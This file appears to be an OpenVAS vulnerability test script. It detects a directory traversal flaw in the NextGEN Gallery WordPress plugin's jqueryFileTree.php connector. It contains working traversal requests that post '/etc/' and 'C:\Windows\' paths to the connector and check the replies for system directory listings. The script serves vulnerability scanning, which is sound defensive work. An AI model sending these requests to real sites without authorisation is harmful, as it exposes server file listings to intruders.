###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_nextgen_gallery_dir_trav_vuln.nasl 7003 2017-08-25 09:22:10Z asteins $
#
# WordPress NextGEN Gallery 'jqueryFileTree.php' Directory Traversal Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804510";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 7003 $");
  script_bugtraq_id(65637);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-08-25 11:22:10 +0200 (Fri, 25 Aug 2017) $");
  script_tag(name:"creation_date", value:"2014-03-07 17:46:21 +0530 (Fri, 07 Mar 2014)");
  script_name("WordPress NextGEN Gallery 'jqueryFileTree.php' Directory Traversal Vulnerability");

  tag_summary =
"This host is installed with Wordpress NextGEN Gallery Plugin and is prone
to directory traversal vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
local directory list or not.";

  tag_insight =
"Flaw is due to the 'jquery.filetree/connectors/jqueryFileTree.php' script not
properly sanitizing user input, specifically absolute paths passed via 'file'
POST parameters.";

  tag_impact =
"Successful exploitation will allow remote attackers to read arbitrary file
details on the target system.

Impact Level: Application";

  tag_affected =
"WordPress NextGEN Gallery Plugin version 2.0.0, Other versions may also be
affected.";

  tag_solution =
"Upgrade to WordPress NextGEN Gallery version 2.0.7 or later,
For updates refer to http://wordpress.org/plugins/nextgen-gallery";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125285");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2014/Feb/171");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

foreach postdata (make_list("dir=%2Fetc%2F", "dir=C%3A%5CWindows%5C"))
{
  ## Construct directory traversal attack
  url = dir + "/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen"+
              "/modules/nextgen_addgallery_page/static/jquery.filetree/connect"+
              "ors/jqueryFileTree.php";

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n\r\n",
                postdata);

  ## Send request and receive the response
  res = http_keepalive_send_recv(port:http_port, data:req);

  if("/etc/init" >< res || "C:\Windows\system32" >< res)
  {
    security_message(port:http_port);
    exit(0);
  }
}
